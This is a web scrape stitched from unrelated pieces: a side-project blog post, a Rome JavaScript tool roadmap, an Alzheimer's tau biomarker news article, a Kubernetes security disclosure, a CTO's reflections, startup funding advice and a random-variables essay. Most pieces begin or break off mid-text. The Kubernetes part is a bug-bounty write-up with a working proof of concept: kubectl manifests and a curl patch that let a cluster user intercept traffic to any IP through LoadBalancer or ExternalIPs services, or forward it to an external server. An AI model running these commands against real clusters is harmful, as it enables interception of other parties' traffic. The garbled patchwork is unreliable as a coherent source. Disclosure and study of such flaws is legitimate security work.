<p>2) I started working on <a rel="noreferrer noopener" href="https://outflash.xyz/" target="_blank">Outflash</a> at the end of July 2019. By October of the same year I had launched the product. Built a marketing website. Created various social media accounts to try and promote the product. At the time of writing this post, I had just over 20 installs of the free version of the Outlook plugin. From idea to launch took less than 6 months, very happy with that turnaround.</p>



<p>3) I managed to get the reporting suite built in <a rel="noreferrer noopener" aria-label="Elementary Analytics (opens in a new tab)" href="https://elementaryanalytics.com/" target="_blank">Elementary Analytics</a>. The product is now in MVP, with only a few small tweaks that need to be completed. The marketing site has been reworked as well (using <a rel="noreferrer noopener" aria-label="Basecamp's (opens in a new tab)" href="https://basecamp.com/" target="_blank">Basecamp’s</a> marketing site as my guide). Amazingly someone registered for the service in January 2020, without me doing any additional marketing work. I’ve also been able to get feedback from a few potential users, helping me come up with a direction for the product, which was one of the major stumbling blocks I had.</p>



<p>4) Another idea that a friend suggested I do, is a sister website to <a rel="noreferrer noopener" aria-label="footballsocial.club (opens in a new tab)" href="https://www.footballsocial.club/" target="_blank">footballsocial.club</a> called <a rel="noreferrer noopener" aria-label="cricketsocial.club (opens in a new tab)" href="https://cricketsocial.club/" target="_blank">cricketsocial.club</a>. I managed to get this site setup in a few days. I have been reaching out to people on Facebook who are members of existing Cricket based groups to see if they would be interested in trying the site. So far I have had one or two sign-ups. Not bad for a weekend’s worth of work.</p>



<h4>Frustrations</h4>



<p>1) Still haven’t been able to find my first paying customer. Instead of hearing the sounds of a till register, I’m hearing crickets. I’m trying to show some patience, mainly I’ve extremely frustrated.</p>



<p>2) Running ad campaigns on LinkedIn, Facebook, Reddit, Quora and Pinterest all seem to have struck a blank. Although I think a Bing Ad campaign has helped me get a few installs for Outflash.</p>



<p>3) I’m finding that marketing is a very slow process and isn’t a rewarding straight away. You aren’t always sure what you are doing will work. Starting from zero is also difficult as very few people will see your marketing efforts. </p>



<p>4) Writing blog posts, creating YouTube videos, finding relevant content to share on social media, coming up with my own social media campaigns is an effort in itself. I could easily 60+ hours a week on this.</p>



<p>5) Doesn’t feel I am any closer to being able to make the switch from employee to owner. </p>



<h4>Trials</h4>



<p>1) I have setup a YouTube channel for Elementary Analytics, which I’m hoping to create a series of “How To” videos. Showing people what Elementary Analytics is, how to use the service and how it can benefit them. This  idea come from “Do something you haven’t done before”.</p>



<p>2) As mentioned, working on these side projects is a bit of a juggling act. Trying to spend 50% of my time programming and 50% on marketing effort can be a challenging. What I have decided to do is do one week on development work. The next week focus solely on marketing. I was trying to do it on a day to day basis, but found I wasn’t focusing enough and if I had some left over tasks from the previous day. It impacted productivity the day after.</p>



<p>3) Instead of trying to do all this complex marketing, sales funnels, etc. I’m planning trying to contact potential customers directly. I’ve been able to move the needle slightly with Outflash. However, Elementary Analytics has been a different kettle of fish. My plan is to email potential customers to see if Elementary Analytics would be of use to them. If I get any feedback I can use the info to hopefully make informed decisions to move forward.</p>



<h4>Tribulations</h4>



<p>1) Still feels like I am getting nowhere fast. People say it’s good as you are “finding what doesn’t work”. This isn’t giving me any solace. It’s just adding to my overall “pissed off mood”. </p>



<p>2) My list of things to get done doesn’t seem to be getting any smaller. Even though I am getting through a fair bit of work each week, the list in my Trello board seems to be never ending.</p>



<p>3) Still tweaking and playing around with the products. “If I just implement this” or, “If I redo this, then…”. I will be stopping this very soon, Outflash is nearly at a point were it is a product I am happy with. Elementary Analytics shouldn’t be to far behind either.</p>



<p>There you have it. This is part two of my “regular” rant about starting a side hustle.</p>



<p>I’m hoping over the coming weeks and months that these posts will become more and more positive. Things have been a lot better of the last couple of months. Not were I want things to be, to quote The Rolling Stones “You can’t always get what you want”.</p>



<p>Thanks for reading part two of starting a side hustle. Would like to hear your thoughts. Phil</p>

These tools have both inspired me to create Rome, a new project that aims to simplify and improve JavaScript and web development.</p> <p>Rome consolidates dozens of separate tools into one. Rome can install your dependencies, check your code for errors, run your tests, bundle your code, and more, all via a single CLI. Rome will be able to replace Babel, ESLint, Prettier, Yarn, and webpack. <a href="https://rome.tools/">Learn more</a>.</p> <p>It’s been three months since we announced our initial <a href="https://rome.tools/blog/2020/08/08/introducing-rome.html">beta release</a>. Since then, we’ve received a tremendous amount of enthusiasm from the community. As that enthusiasm has grown, it’s become clear that Rome will require a full-time developer to be successful and deliver on our ambitious goals and release a stable v1.0.</p> <p><strong>I need your help to make it a reality.</strong></p> </section> <section> <h2 id="funding">Funding <a href="#funding" aria-label="funding"></a></h2> <p>I have left my job so I can work independently and focus on what the community needs.

We can make Rome easier to use and work for more people.</p> <section> <h3 id="add-more-configuration-and-have-less-opinions">Add more configuration and have less opinions <a href="#add-more-configuration-and-have-less-opinions" aria-label="add-more-configuration-and-have-less-opinions"></a></h3> <p>We have deliberately tried to keep configuration to a minimum. While this does produce a minimal API surface, it makes it almost impossible to easily migrate without losing functionality or changing conventions.</p> <p>We should aim to reduce the functional differences between Rome and other tools by introducing additional configuration and supported languages. This could include:</p> <ul> <li>Code formatting options</li> <li>Ability to customize expected filenames and directories</li> <li>Support for other configuration languages such as YAML and TOML</li> <li>More CLI flags</li> <li>Public JavaScript API</li> <li>Dynamic configuration (as opposed to static JSON-only configuration files)</li> <li><a href="#allow-users-to-extend-functionality-with-plugins">Allow extending functionality with plugins</a></li> </ul> <p>We have so far kept configuration light, as by reducing the amount of configuration options supported, we reduce maintenance cost and the potential for internal bugs.</p> <p>While this makes it easier for us as maintainers, it makes it drastically more difficult for users. No matter how persuasive our arguments may be for why you should use hard tabs instead of spaces, they seem like artificial and arbitrary constraints and introduces excessive prerequisites for adoption.</p> <p>Strong defaults and guided documentation for new users can provide the experience we ultimately want to offer, while removing our existing adoption restrictions.</p> </section> <section> <h3 id="integrate-with-existing-tools">Integrate with existing tools <a href="#integrate-with-existing-tools" aria-label="integrate-with-existing-tools"></a></h3> <p>Rome attempts to replace many tools. However we should still strive to support scenarios where another tool is better situated or preferred. This can also help during a migration where Rome is used in conjunction with another tool. We can do this in a couple of ways:</p> <p><strong>Integrating Rome as a first-class plugin in tools such as Babel, eslint, and webpack</strong></p> <p>Rome could be exposed as a plugin for those tools to allow you to adopt the Rome compiler without having to adopt the bundler first. This would reduce adoption prerequisites and allow easier experimentation inside of existing setups.</p> <p><strong>Seamlessly integrate other tools into Rome</strong></p> <p>We can introduce compatibility layers to have ESLint, Babel, and other tools run inside of Rome itself. ESLint errors could be displayed alongside Rome linter errors with the same UI and output format Instantly you could benefit from Rome’s file caching and parallelisation without needing a major migration.</p> </section> <section> <h3 id="assist-in-migrating-from-existing-tools">Assist in migrating from existing tools <a href="#assist-in-migrating-from-existing-tools" aria-label="assist-in-migrating-from-existing-tools"></a></h3> <p>It should be easy to migrate from other tools to Rome. First we need to ensure popular configuration options from other tools are supported. Then, offer automated tools to migrate basic setups without users needing to it manually.</p> <p>This needs to be accompanied with dedicated documentation and guides that can explain the differences between the tools, why you might want to use one over the other, similar concepts, new terminology, and equivalent config options.</p> </section> <section> <h3 id="allow-users-to-extend-functionality-with-plugins">Allow users to extend functionality with plugins <a href="#allow-users-to-extend-functionality-with-plugins" aria-label="allow-users-to-extend-functionality-with-plugins"></a></h3> <p>One of the fears with Rome is creating a monoculture where it’s impossible to innovate and experiment with new ideas. While it’s extremely optimistic to think we’ll ever get into any sort of monopolistic position, not allowing extensions does stiffle innovation regardless of our market position by restricting the viability and adoption of new ideas.</p> <p>Plugins allow us to avoid supporting functionality that we might not want, while still giving users a choice. It reduces our role as an arbiter and allows new languages, non-standard JavaScript features, code conventions, and ideas that interact with Rome to be viable, receive support, and proliferate.</p> <p>We need to be extremely careful not to get into the position where Babel and Webpack are today, where they’re heavily restricted by the usage of internal APIs. We need to be able to maintain our autonomy when it comes to making architectural changes. Balancing this with a powerful plugin API will be a challenge and will likely require several iterations.</p> </section> <section> <h3 id="release-undocumented-features">Release undocumented features <a href="#release-undocumented-features" aria-label="release-undocumented-features"></a></h3> <p>Rome currently does a lot more than linting. It’s a major challenge today to market and explain Rome when so much of the project isn’t officially supported. While we strive to make each individual component of Rome competitive on it’s own, to some the biggest advantage and compelling reason for using Rome might be the reduction in dependencies.</p> <p>We should focus on releasing and maturing basic versions of all core functionality. This would increase user confidence in our architecture and show that Rome is viable as the comprehensive replacement that we want to be.</p> </section> <section> <h3 id="provide-accessible-and-comprehensive-documentation">Provide accessible and comprehensive documentation <a href="#provide-accessible-and-comprehensive-documentation" aria-label="provide-accessible-and-comprehensive-documentation"></a></h3> <p>Documentation for developer tools is generally quite obtuse and relies a lot on prerequisite knowledge. This can make it intimidating and inaccessible for developers new to the ecosystem. Further complicating that is the broad scope of what Rome is trying to do.</p> <p>We have tried to address some of this by making our documentation a single page. This makes it easy to search, and it can be read from top to bottom without needing to jump around to learn about different concepts. However as our supported features grow, it will be more difficult to use this structure without oversimplifcation and doesn’t allow different paths for different demographics.</p> <p>We need to invest in a more scalable approach for our documentation. We can offer dedicated sections that explain features like linting end-to-end without needing to introduce other components like the compiler and bundler that contain significantly more concepts and overwhelm the reader. Separate guides can be offered for new users and those already experienced with other tools to properly cater for multiple audiences.</p> </section> <section> <h3 id="regularly-release-new-versions">Regularly release new versions <a href="#regularly-release-new-versions" aria-label="regularly-release-new-versions"></a></h3> <p>One of the reasons Babel was successful is how quickly I was able to quickly fix bugs and release new versions. I would regularly have releases out within minutes of a bug report. This was critical during the early days when adoption was low. Being able to unblock users quickly would often make them more excited to use Babel even though they ran into a bug.</p> <p>Similarly, we should try and replicate this by building out our release infrastructure to allow the rapid testing and release of versions. We need to maintain momentum as the scope of supported features grow.</p> <p>We can achieve this with automated releases that can be manually triggered or deployed on a schedule.

Bateman and first author Kanta Horie, PhD, a visiting scientist in Bateman’s lab, realized that specific MTBR tau species were enriched in the brains of people with Alzheimer’s disease, and that measuring levels of the species in the cerebrospinal fluid that bathes the brain might be a way to gauge how broadly the toxic tangles have spread through the brain. Previous researchers using antibodies against tau had failed to detect MTBR tau in the cerebrospinal fluid. But Horie and colleagues developed a new method based on using chemicals to purify tau out of a solution, followed by mass spectrometry.</p><p>Using this technique, Horie, Bateman and colleagues analyzed cerebrospinal fluid from 100 people in their 70s. Thirty had no cognitive impairment and no signs of Alzheimer’s; 58 had amyloid plaques with no cognitive symptoms, or with mild or moderate Alzheimer’s dementia; and 12 had cognitive impairment caused by other conditions. The researchers found that levels of a specific form — MTBR tau 243 — in the cerebrospinal fluid were elevated in the people with Alzheimer’s and that it increased the more advanced a person’s cognitive impairment and dementia were.</p><p>The researchers verified their results by following 28 members of the original group over two to nine years. Half of the participants had some degree of Alzheimer’s at the start of the study. Over time, levels of MTBR tau 243 significantly increased in the Alzheimer’s disease group, in step with a worsening of scores on tests of cognitive function.</p><figure data-orig-height="467" data-orig-width="700"><img src="https://64.media.tumblr.com/b80f5e6d9222f0044e0c36a76f464ec8/a732b01a66a4a7cb-da/s1280x1920/353cb72a4ec9acf360e43a1eb0a68bb6998b1887.jpg" data-orig-height="467" data-orig-width="700" width="700" height="467" alt="image"></figure><p><i>Image:&nbsp;Researchers at Washington University School of Medicine in St. Louis have found a novel form of the Alzheimer’s protein tau in the fluid surrounding the brain and spinal cord.

The amount of tau visible in a brain scan correlates with cognitive impairment. To see how their technique matched up to the gold standard, the researchers compared the amount of tau visible in brain scans of 35 people — 20 with Alzheimer’s and 15 without — with levels of MTBR tau 243 in the cerebrospinal fluid. MTBR tau 243 levels were highly correlated with the amount of tau identified in the brain scan, suggesting that their technique accurately measured how much tau — and therefore damage — had accumulated in the brain.</p><p>“Right now there is no biomarker that directly reflects brain tau pathology in cerebrospinal fluid or the blood,” Horie said. “What we’ve found here is that a novel form of tau, MTBR tau 243, increases continuously as tau pathology progresses. This could be a way for us to not only diagnose Alzheimer’s disease but tell where people are in the disease. We also found some specific MTBR tau species in the space between neurons in the brain, which suggests that they may be involved in spreading tau tangles from one neuron to another. That finding opens up new windows for novel therapeutics for Alzheimer’s disease based on targeting MTBR tau to stop the spread of tangles.”</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmedicine.wustl.edu%2Fnews%2Fnovel-form-of-alzheimers-protein-found-in-spinal-fluid-indicates-stage-of-the-disease%2F&amp;t=NjQ3ZDkxMmM4NmNlNjU2MTA1ZWQyMTQwMjVlNjEwNzMyYmY0Yjc2ZixES3V5WjNqTQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F636913398485073920%2Falzheimers-new-protein-in-spinal-fluid&amp;m=0&amp;ts=1607545760">Washington University School of Medicine</a></b></p><p><b>Full study:</b>&nbsp;“CSF tau microtubule binding region identifies tau tangle and clinical stages of Alzheimer’s disease”, <i>Brain</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1093%2Fbrain%2Fawaa373&amp;t=ODBmNDZkZjFmZjEzYTlhMjRkZjZhY2M0OTVkNTlhY2FjNDM3YTdlYSxES3V5WjNqTQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F636913398485073920%2Falzheimers-new-protein-in-spinal-fluid&amp;m=0&amp;ts=1607545760">https://doi.org/10.1093/brain/awaa373</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/625031181195509760/new-blood-test-alzheimers">Novel blood test could greatly improve diagnosis of Alzheimer’s</a></p>

December 7, 2020 | https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/ | <a href="https://web.archive.org/web/*/https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <section id="main_content">
        

<p>It’s 2 weeks before the end of 2019, we are deploying a Kubernetes cluster at a client with MetalLB as LoadBalancer,
and for unknown reasons at the time, MetalLB VIP randomly stops working (in the end it was too small CPU limits but that’s not important).
As we need to have the platform in production before the end of year,
we agree with the client to put some workaround in place to temporarily replace MetalLB.</p>

<p>Instead of modifying our deployments to add <code>hostPort</code>, I got a clever idea,
why not create a new <code>Service</code> with as <code>ExternalIPs</code> the node IPs,
it would allow to get the traffic from node_x_IP:443 to the right pods and allow us
to debug MetalLB on the side.</p>

<p>We immediately applied the following manifest:</p>
<div><div><pre><code>apiVersion: v1
  kind: Service
  metadata:
    name: myapp
    namespace: anevia
spec:
  ports:
  - name: http
    port: 80
    protocol: TCP
    targetPort: 80
  - name: https
    port: 443
    protocol: TCP
    targetPort: 443
  selector:
    app: myapp
  externalIPs:
  - &lt;node_1_IP&gt;
  - &lt;node_2_IP&gt;
  ...
  - &lt;node_n_IP&gt;
</code></pre></div></div>
<p>and it immediately broke the cluster.</p>

<p>Kube-proxy IPVS adds the <code>ClusterIP</code>, <code>ExternalIP</code> and <code>LoadBalancerIP</code> to the <code>kube-ipvs0</code> interface,
so the nodes could not talk to each other anymore.</p>

<p>After fighting a bit to repair the cluster with one of my colleagues, I had a light bulb moment:
I just need to set <code>externalIPs</code> to intercept the traffic of any IP, this is NICE (MITM as a Service).</p>

<p>As I had already reported a security issue to Kubernetes (<a href="https://blog.champtar.fr/CVE-2019-9946/">CVE-2019-9946</a>),
I was invited to the private launch of Kubernetes bug bounty during the summer of 2019.
Of course the invite had expired, but I was able to get a new one quickly.</p>

<h2 id="poc">POC</h2>

<p>First create the target MITM pod</p>
<div><div><pre><code>kubectl apply -f - &lt;&lt;'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: kubeproxy-mitm
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: echoserver
  namespace: kubeproxy-mitm
spec:
  replicas: 1
  selector:
    matchLabels:
      app: echoserver
  template:
    metadata:
      labels:
        app: echoserver
    spec:
      containers:
      - image: gcr.io/google_containers/echoserver:1.10
        name: echoserver
        ports:
        - name: http
          containerPort: 8080
        - name: https
          containerPort: 8443
EOF
</code></pre></div></div>

<p>Then to perform the MITM using LoadBalancer, just replace <code>&lt;IP&gt;</code> with the IP you want to MITM</p>
<div><div><pre><code>kubectl apply -f - &lt;&lt;'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-lb
  namespace: kubeproxy-mitm
spec:
  ports:
  - name: http
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
  selector:
    app: echoserver
  type: LoadBalancer
  loadbalancerIP: &lt;IP&gt;
EOF
kubectl proxy --port=8080 &amp;
sleep 3
curl -k -v -XPATCH  -H "Accept: application/json" -H "Content-Type: application/merge-patch+json" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-lb/status' -d '{"status":{"loadBalancer":{"ingress":[{"ip":"&lt;IP&gt;"}]}}}'
kill $!
</code></pre></div></div>

<p>Or to perform the MITM using ExternalIP, just replace <code>&lt;IP&gt;</code> with the IP you want to MITM</p>
<div><div><pre><code>kubectl apply -f - &lt;&lt;'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-externalip
  namespace: kubeproxy-mitm
spec:
  ports:
  - name: http
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
  selector:
    app: echoserver
  type: ClusterIP
  externalIPs:
    - &lt;IP&gt;
EOF
</code></pre></div></div>

<p>You can also redirect the MITM traffic to an external server, by removing the selector of the service, and manually creating Endpoints</p>
<div><div><pre><code>kubectl apply -f - &lt;&lt;'EOF'
apiVersion: v1
kind: Endpoints
metadata:
  name: mitm-externalip
  namespace: kubeproxy-mitm
subsets:
- addresses:
  - ip: &lt;EXTERNAL SERVER IP&gt;
  ports:
  - name: http
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
EOF
</code></pre></div></div>

<p>This also works for UDP (so DNS)</p>

<h2 id="tests">Tests</h2>

<p>To properly qualify the issue, I used 3 clusters:</p>
<ul>
  <li>CentOS 7, kubespray, K8S v1.16.3, containerd, Calico, kube-proxy iptables</li>
  <li>same except kube-proxy IPVS</li>
  <li>GKE 1.15.4-gke.22 to make it easier to reproduce the results for K8S Team</li>
</ul>

<p>I found 2 ways to man in the middle the traffic, by:
a) creating a LoadBalancer service and patching the status with the attacked IP
b) creating a ClusterIP service with ExternalIPs set to the attacked IP</p>

<p>For these 2 options, I explored:
1) MITM of IPs external to the cluster
2) MITM of ClusterIP IP
3) MITM of pod IP
4) MITM of 127.0.0.1</p>

<p>This give us the following:</p>

<p><img src="https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/tests.png" alt="test results"></p>

<p>4b is already blocked.</p>

<p>2/3/4 could all be blocked by default, as those are not valid use cases.</p>

<p>1 is expected behavior for me, I want my pods to be able to talk to ExternalIP or LoadBalancerIP.</p>

<p>Another issue seen during my tests is that you can have multiple services with the same externalIP/port</p>
<div><div><pre><code># kubectl get svc -n kubeproxy-mitm
NAME                    TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE

</code></pre></div></div>
<p>The service that gets the traffic seems to be random.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  <p>There is a lot written about the importance of scaling as a founder in a fast-growing startup. Most of it focused on the CEO role. The generic advice on leadership also applies to other non-CEO roles, but I could not find a lot of content targeted to technical founders. In fact, after reading a <a href="https://twitter.com/elwatto/status/1230977002192031744?s=20" target="_blank">bunch of S-1 forms</a>, <strong>it was hard to find first-time CTOs going all the way from MVP to IPO</strong> (as opposed to founding CEOs). I found this fact really intriguing, and I wanted to dig deeper to try to understand the reasons. It was also stressing me out to some degree: <em>what if I don’t manage to scale fast enough? What does scaling even mean? I’d rather prepare before it becomes a real problem! I want to be the CTO who makes <a href="https://revenuecat.com/" target="_blank">RevenueCat</a> a public company!</em><sup>1</sup></p>

<p>Is it really much harder for non-CEO founders to scale quickly? Or perhaps it is that CEOs have a stronger support network. These could be the reasons. Or maybe I was asking the wrong question. After talking to a lot of founder CTOs, there was something clear: <strong>there is no standard definition for the CTO role</strong>, responsibilities will totally change <strong>depending on the company and the stage</strong>. At inception, the CTO is probably a glorified individual contributor, but this can escalate very quickly. Everyone’s experiences are different. Unfortunately, I don’t have the answers for other non-CEO founder roles, and maybe I don’t even have it for first-time CTOs either. However, I thought it would be a good self-awareness exercise to reflect on the things I’ve learned and how my responsibilities have changed during the first 3 years at <a href="https://revenuecat.com/" target="_blank">RevenueCat</a>.</p>

<h3 id="the-cto-vs-vp-of-engineering-dilemma">The CTO vs VP of Engineering dilemma</h3>
<p>Simplifying, we could say that the CTO role is closer to architecture and code; whereas the VPE would be in charge of processes and management. A simple analogy could be the Senior/Staff Engineer path versus the Engineering Management career path.</p>

<p>During the early days, you need a CTO to architect and coordinate a small group of ICs hacking the minimum viable product. At this stage, being a founder is extremely helpful to set the vision of the product and the engineering culture. Ideally, the CTO is a domain expert in the problem that the startup is trying to solve.</p>

<p>But what if the product becomes successful? What if you reach product-market fit? You will need to hire a lot more engineers to satisfy customer demands. That’s a great problem to have. You might get lucky and get funding, or you might even be profitable already. But a higher headcount means more polished processes. At some point, somebody will inevitably need to start wearing the VP of Engineering hat. It will happen, and it will become quite obvious as the previous (or lack of) processes start to break. You have a couple of options at this stage. The CTO can start acting as VPE, or you can hire externally. It is probably a matter of personal preference or previous management experience. But <strong>it is a totally different set of skills</strong>, which might be difficult to acquire in a hyper-growth environment. Therefore, most commonly, the VP of Engineering is <a href="https://www.saastr.com/makes-bad-cto/" target="_blank">hired externally</a>.</p>

<p>If you are a founder you have some flexibility. You might have control to decide which way you want to go. Perhaps you hate people management and want to keep using your technical skills and problem knowledge to influence the technology directly. Or maybe you want to improve your management skills. Early employees tend to be more forgiving about founder managerial flaws. They joined because they trusted the founders, believed in the vision, and know they have good intentions. In the beginning, they might even prefer you as a direct manager than an external person. But eventually, there will be several layers of management, so you better learn fast if you want to follow this path and don’t have the experience.</p>

<p>Bryan Helmig, Zapier’s co-founder and CTO, says you need to <a href="https://zapier.com/engineering/startup-cto/" target="_blank"><em>figure out where you get your dopamine hits</em></a>. Personally, I have always been more of a <em>computer person</em> than a <em>people person</em>. 
I was not sure which path I should take, but I would have bet on the one involving computers. I’ve always loved them, and I would say I am a better, more experienced engineer than I am a manager. I feel  more energized after shipping a new feature than during a one-on-one meeting.</p>

<p>However, as a founder, <strong>I get the dopamine hits when the company is doing well</strong>. When a customer recommends our product. When we hit the revenue goal. When we hire engineers that are better than me. When these engineers are happy and successfully shipping ambitious features. When code review is exhaustive but collaborative, not adversarial.</p>

<p>So, ultimately, I’ve taken the approach to not simply follow my personal preference, but to <strong>do whatever is more impactful for the company at each stage</strong>. I am a problem solver after all. That is how I have been thinking about my role. My <strong>founder identity should be more important than my CTO title</strong>. In the long run, as a major shareholder, I need to do whatever is best for the company.</p>

<p>Typically breaking points start happening <strong>somewhere between 8 and 12 engineers</strong>. But it can be different depending on the product and the environment. In our case, as a fully distributed company, we encountered several breaking points as we were adding new time zones. During this <em>no man’s land stage</em> most technical founders are temporarily forced to wear both CTO and VPE hats simultaneously. Being flexible turned out to be very advantageous. I tried to step up and (poorly and temporarily) do work that nobody had the bandwidth to do. This helped me to identify the pain points and tweak the process or hire somebody to take over these tasks.</p>

<p>One thing that helped me a lot to navigate my role was to learn how other founders were spending their time at each stage. I have been journaling since we started the company. Based on these notes, I will briefly describe the tasks I’ve been focused on and how my role has evolved.</p>

<h2 id="2018-yc-mvp-and-first-hires">2018: YC, MVP, and first hires</h2>
<p>When we did Y-Combinator it was only <a href="https://twitter.com/jeiting" target="_blank">Jacob</a> and me. Jacob would write SDK and frontend code and I would focus on the backend and infrastructure. After YC we hired our first two engineers to take over Jacob’s coding responsibilities full time. We were all based in San Francisco and these hires were people we already knew. Easy (almost inexistent) management. <strong>There was no process overhead</strong>, we had one-week sprints and <strong>we were moving really fast</strong>.</p>

<p>These days were stressful but fun. We were setting the foundations of the engineering culture and seeing customers signing up one by one. Most of my time was spent architecting the initial version of features, listening to customers, and building their requests as fast as we humanly could. <strong>We would ship most requests on the same day</strong>.</p>

<p>My biggest concern here was making sure we were building something people wanted and the ability to keep growing to justify our <a href="https://techcrunch.com/2018/10/24/revenuecat-seed-funding/" target="_blank">$1.5M seed round</a>.</p>

<p><strong>Main learnings</strong>: Too many, impossible to summarize. We learned a lot while doing Y-Combinator. The main thing would be that talking to customers, building what they want, and making them happy was paramount. We even made this and shipping fast two of our <a href="https://www.revenuecat.com/blog/values" target="_blank">core values</a>.</p>

<h2 id="2019-keeping-up-with-customers-and-scaling-the-tech">2019: Keeping up with customers and scaling the tech</h2>
<p>It looks like we had achieved some kind of product-market fit. <strong>Customers were coming to us, support tickets started piling up and our API throughput would increase every day</strong>. We added our first remote engineer, located in Taiwan. The time zone difference was hard initially and we needed to adapt processes. But it all worked out fine. We got better coverage for customer requests and monitoring.</p>

<p><strong>Onboarding was a complete, one-off manual process</strong>. I started doing one-on-ones (not very regularly, maybe once a month), but <strong>management was still pretty light</strong>. Most conversations were still very technical. I was still an individual contributor. I was also on booth duty at a couple of conferences.</p>

<figure>
  <img src="https://miguelcarranza.es/assets/posts/boothduty.JPG" alt="Booth Duty, AltConf 2019">
</figure>

<p>My main concern at this stage was purely technical: <strong>the scalability of our systems</strong>. All of our engineers had a more product-oriented background, and we had some clear single points of failure. Not going down was constantly in my mind. The scale was outgrowing my comfort zone every single day. We did a decent job optimizing the most common scenarios, <a href="https://www.revenuecat.com/blog/aurora-migration-zero-downtime" target="_blank">migrating infrastructure before reaching breaking points</a>, and <strong>paying down the technical debt we took the year before</strong>.</p>

<p>Up until Q4, I was the de-facto on-call engineer. I did not want to disturb other team members outside working hours, and I felt reliability was my ultimate responsibility as a technical founder. I would carry my laptop literally everywhere. Eventually, <strong>we implemented an on-call rotation, and in retrospect, we should have done it earlier</strong>.</p>

<p><strong>Main learnings</strong>: Do not stress over scalability, but monitor as much as possible and always look out for the next bottleneck and single point of failure. Again, these are stressful but great problems to have. Establish an on-call policy as soon as possible, train engineers, and document resolution for known incidents. Rely on your team. <a href="https://miguelcarranza.es/technical-debt" target="_blank">Technical debt is actually good</a> if taken responsibly while trying to find product-market fit.</p>

<h2 id="2020-delegation-and-planning-the-future-organization">2020: Delegation and planning the future organization</h2>
<p>In 2020 we doubled the team again. We added engineers in Europe and Latin America. By the end of the year, we had multiple members in every team (SDK, frontend, backend…). We were able to work on several projects at the same time, and finally tackle more ambitious features. But we needed more coordination. <strong>A little bit of management structure was unavoidable at this stage.</strong></p>

<p>During Q1 and Q2 I spent most of my time reviewing code, providing architectural guidance, and coding a little bit on the side. I was still the person who had more context about our systems. By mid-year, it became very obvious that I was the bottleneck for …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="sectionfunding" role="tabpanel"><div>
						<div><p>There are several ways to get funding for your Startup such as <strong>Angel Investment, Venture Capital, Accelerator funding, Government Grants, and Crowdfunding</strong>.</p>
<p>Angel Investors, Venture Capitalists, and Accelerators usually look to <strong>invest in Startup’s for an equity share</strong> when they believe the Startup has a high chance of success. Angel Investors are individuals or groups of individuals that invest their own money, whereas Venture Capitalists are employees of Venture Capital firms that invest other people’s money.</p>
<p>The difference between these two is that <strong>Angel Investors will generally want some level of control</strong> over the direction of the company although offer valuable business experience. Whereas Venture Capitalists offer the potential for large investment but typically want to take on <strong>Startup’s that can grow fast and have an exit strategy</strong> (such as IPO or acquisition) so they can get a return on their investment.</p>
<p><strong>Accelerators</strong> are a bit different to Angel Investors and Venture Capitalists in what they offer. Accelerators are usually a fixed term program that provides access to <strong>mentoring, expert advice, industry contacts, and resources in addition to funding</strong>.</p>
<p>Often Startups will start by self funding their idea until they can <strong>prove/display the need for a solution</strong> to investors. This is commonly done through <strong>creating a MVP</strong> (Minimum Viable Product) and gaining traction with users.</p>
<p>Some other ways to display the desire for a solution include <strong>creating a landing page</strong> that demonstrates what your app will do and allows interested users to signup to a mailing list for updates on the product. Or to <strong>use manual processes</strong> that replicate what a solution would do and allows users to use it in a similar way. For example, helping users plan their holidays manually to prove the need for a holiday planning app.</p>
<p><strong>Crowdfunding</strong> can be used to raise capital in cases where <strong>niche communities may highly desire a solution to a problem. </strong>Crowdfunding allows outside contributors to donate to fund development of the new product. In many crowdfunding campaigns donators money will not be taken until a significant funding milestone is hit that would allow for creation of the product. Contributors are often incentivised by the completion of the finished product, a small gift or even a credit down the line.</p>
<p>Some <strong>Australian Government Grants</strong> that are useful for Startups include <strong>MVP Grants and R&amp;D Tax Offsets</strong>. MVP Grants of up-to $25k are accessible in NSW for Startups who are pre-revenue with a proof of concept ready to test. R&amp;D Tax Offsets can be claimed by businesses for eligible R&amp;D expenditure.</p>

<p>Protocols for the simple and robust production of chitosan nanoparticle vaccines for intranasal delivery have been published for over two decades.

            <section>
                
            </section>
            <p>This is one of the basic ideas that are commonly not understood properly, we learn
this from the high school level. Currently, most of the exploration is going
back to basics and wondering why they are defined like that. I can see that most of the
definitions have mathematical backgrounds and general theorems or axioms
present, which I'm trying to understand more now. Here I want to see what’s
the intuition behind the Random Variables.</p>
<blockquote>
<p><strong>From Wikipedia:</strong></p>
<p>A Random variable / Random Quantity/ Stochastic Variable is
described as a variable whose value depends on the outcomes of a random phenomenon.</p>
</blockquote>
<p>Definition based on Measure Theory is more intuitive,</p>
<blockquote>
<p>Random Variable isn't a variable, it's a function which maps objects to real valued line.</p>
</blockquote>
<p>The definition of a Random variable in Formal Mathematical term is defined using
Measure Theory, It seems measure theory based intuitions are easier to connect
rather than statements which define the random variable. Usually, we remember
things if we can associate them with some real-world entities or actions, which
is more intuitively we can recollect when we want to restate or understand other
similar concepts. I’m trying to wrap around this basic idea using measure
theory.</p>
<h2>Measure Theory</h2>
<p>Very generically we can say, Measure can be explained using the Set Theory from
